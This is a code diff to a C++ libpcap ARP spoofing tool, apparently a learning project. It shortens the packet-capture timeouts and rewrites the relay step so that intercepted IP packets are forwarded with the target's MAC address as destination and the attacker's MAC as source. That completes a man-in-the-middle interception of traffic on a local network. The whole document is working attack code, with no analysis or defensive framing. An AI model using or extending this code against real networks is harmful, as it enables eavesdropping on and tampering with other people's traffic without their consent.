@@ -76,7 +76,7 @@ Mac UnknownMacAddress(char *name, Ip my_ipAdd, Mac my_macAdd, Ip unknown_ipAdd){
 
     char* dev = name;
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 
     EthArpPacket packet;
 
@@ -132,7 +132,7 @@ Mac UnknownMacAddress(char *name, Ip my_ipAdd, Mac my_macAdd, Ip unknown_ipAdd){
 void SenderTargetModulation(char* name, char* sender, char* target, map<Ip,Mac> arp){
     char* dev = name;
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 
     Ip sender_IP_Add = Ip (sender);
     Ip target_IP_Add = Ip (target);
@@ -185,7 +185,7 @@ void GetSpoofedPacket(char* dev, Ip my_IP_Add, Mac my_Mac_Add, map<Ip,Mac> arp_t
     map<Ip, Mac>::iterator iter;
     
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 
     while (true) {
         struct pcap_pkthdr* header;
@@ -263,7 +263,16 @@ void GetSpoofedPacket(char* dev, Ip my_IP_Add, Mac my_Mac_Add, map<Ip,Mac> arp_t
 
         //IP -> send relay with my mac address
         if(ntohs(get_eth_hdr->type_) == 0x0800){  //IP
-            memcpy((u_char *)(getpacket + 6), &(my_Mac_Add), 6);
+                Mac temp_target_mac ;
+
+                for (iter = arp_table.begin(); iter != arp_table.end(); ++iter){
+                    if(iter->second != get_eth_hdr->smac_)
+                        temp_target_mac = iter->second;
+                }
+
+            memcpy((u_char *)(getpacket), &(temp_target_mac), 6); //dmac => targetmac
+            memcpy((u_char *)(getpacket + 6), &(my_Mac_Add), 6); //smac => mymacc
+            
 
             int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&getpacket), sizeof(EthArpPacket));
             printf("IP Relay! \n");    
@@ -280,7 +289,7 @@ int main(int argc, char* argv[]) {
     }
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
     if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
